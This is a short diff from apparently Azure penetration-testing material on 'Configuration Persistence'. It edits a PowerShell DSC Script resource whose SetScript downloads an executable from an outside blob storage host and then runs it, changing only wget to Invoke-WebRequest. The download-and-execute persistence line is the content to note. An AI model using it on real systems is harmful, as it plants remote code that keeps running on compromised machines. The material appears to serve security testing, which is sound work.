@@ -7,7 +7,7 @@ Configuration Persistence
         Script ScriptExample
         {
             SetScript = {
-                wget https://azurepentesting.blob.core.windows.net/public/testfile.exe -OutFile c:\testfile.exe
+                Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/public/testfile.exe" -OutFile "c:\testfile.exe"
 				Start-Process C:\testfile.exe -NoNewWindow
             }
             TestScript = { 
